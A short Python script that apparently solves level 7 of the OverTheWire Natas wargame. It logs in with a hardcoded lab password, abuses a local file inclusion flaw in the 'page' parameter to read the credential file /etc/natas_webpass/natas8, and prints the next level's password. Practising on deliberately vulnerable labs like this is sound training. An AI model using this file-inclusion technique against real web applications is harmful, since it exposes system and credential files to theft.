#!/usr/local/bin/env python
import requests
import re

username = "natas7"
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % username

response = requests.get(url, auth=(username, password))
content = response.text
# print(response.text)
print(re.findall('(.*)\n\n<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->', content)[0])
